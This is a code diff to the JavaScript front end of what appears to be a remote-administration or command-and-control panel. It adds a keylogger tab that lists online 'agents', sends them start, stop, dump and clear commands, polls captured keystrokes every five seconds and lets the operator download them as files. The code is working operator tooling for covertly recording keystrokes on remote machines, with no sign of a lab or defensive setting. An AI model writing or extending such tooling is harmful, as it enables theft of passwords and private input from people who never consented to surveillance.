@@ -6,6 +6,11 @@ let historyIndex = -1;
 // Transfer status management
 const TRANSFER_STATUS_KEY = 'fileTransferStatus';
 
+// Keylogger functionality
+let keyloggerActive = false;
+let selectedAgent = null;
+let logUpdateInterval = null;
+
 function saveTransferStatus(status) {
     localStorage.setItem(TRANSFER_STATUS_KEY, JSON.stringify({
         ...status,
@@ -90,6 +95,9 @@ document.addEventListener('DOMContentLoaded', function() {
                         break;
                     case 'storage':
                         updateStorage();
+                        break;
+                    case 'keylogger':
+                        updateAgentSelect();
                         break;
                 }
             }
@@ -1033,4 +1041,200 @@ function previewFile(path) {
             document.removeEventListener('keydown', closeOnEscape);
         }
     });
-} 
+}
+
+// Keylogger functionality
+function updateAgentSelect() {
+    const select = document.getElementById('keylogger-agent-select');
+    if (!select) return;
+
+    // Clear current options except the first one
+    while (select.options.length > 1) {
+        select.remove(1);
+    }
+
+    // Add online agents
+    Object.values(agents).forEach(agent => {
+        if (isAgentActive(agent.last_seen)) {
+            const option = document.createElement('option');
+            option.value = agent.id;
+            option.text = `Agent_${agent.id} (${agent.os_type || 'Unknown'})`;
+            select.add(option);
+        }
+    });
+}
+
+function startKeylogger() {
+    const agentId = document.getElementById('keylogger-agent-select').value;
+    if (!agentId) {
+        alert('Please select an agent first');
+        return;
+    }
+
+    selectedAgent = parseInt(agentId);
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: selectedAgent,
+            command: 'keylogger start'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            alert(`Error starting keylogger: ${data.error}`);
+            return;
+        }
+        keyloggerActive = true;
+        updateKeyloggerStatus();
+        startLogUpdates();
+    })
+    .catch(error => {
+        alert(`Error: ${error}`);
+    });
+}
+
+function stopKeylogger() {
+    if (!selectedAgent) return;
+
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: selectedAgent,
+            command: 'keylogger stop'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            alert(`Error stopping keylogger: ${data.error}`);
+            return;
+        }
+        keyloggerActive = false;
+        updateKeyloggerStatus();
+        stopLogUpdates();
+    })
+    .catch(error => {
+        alert(`Error: ${error}`);
+    });
+}
+
+function downloadLogs() {
+    if (!selectedAgent) return;
+
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: selectedAgent,
+            command: 'keylogger dump'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            alert(`Error downloading logs: ${data.error}`);
+            return;
+        }
+        
+        // Create blob and download
+        const blob = new Blob([data.output], { type: 'text/plain' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `keylogger_${selectedAgent}_${new Date().toISOString()}.txt`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(url);
+    })
+    .catch(error => {
+        alert(`Error: ${error}`);
+    });
+}
+
+function clearLogs() {
+    if (!selectedAgent) return;
+
+    if (!confirm('Are you sure you want to clear the logs?')) return;
+
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: selectedAgent,
+            command: 'keylogger clear'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.error) {
+            alert(`Error clearing logs: ${data.error}`);
+            return;
+        }
+        document.getElementById('keylogger-output').textContent = '';
+    })
+    .catch(error => {
+        alert(`Error: ${error}`);
+    });
+}
+
+function updateKeyloggerStatus() {
+    const indicator = document.querySelector('.status-indicator');
+    const statusText = document.querySelector('.status-text');
+    
+    if (keyloggerActive) {
+        indicator.classList.add('active');
+        statusText.textContent = 'Running';
+    } else {
+        indicator.classList.remove('active');
+        statusText.textContent = 'Stopped';
+    }
+}
+
+function startLogUpdates() {
+    stopLogUpdates();
+    logUpdateInterval = setInterval(fetchLatestLogs, 5000); // Update every 5 seconds
+}
+
+function stopLogUpdates() {
+    if (logUpdateInterval) {
+        clearInterval(logUpdateInterval);
+        logUpdateInterval = null;
+    }
+}
+
+function fetchLatestLogs() {
+    if (!selectedAgent || !keyloggerActive) return;
+
+    fetch('/api/send_command', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            session_id: selectedAgent,
+            command: 'keylogger dump'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.error) {
+            document.getElementById('keylogger-output').textContent = data.output;
+        }
+    })
+    .catch(error => console.error('Error fetching logs:', error));
+}
+
+// Update agent select when switching to keylogger tab
+document.querySelector('[data-tab="keylogger"]').addEventListener('click', updateAgentSelect); 
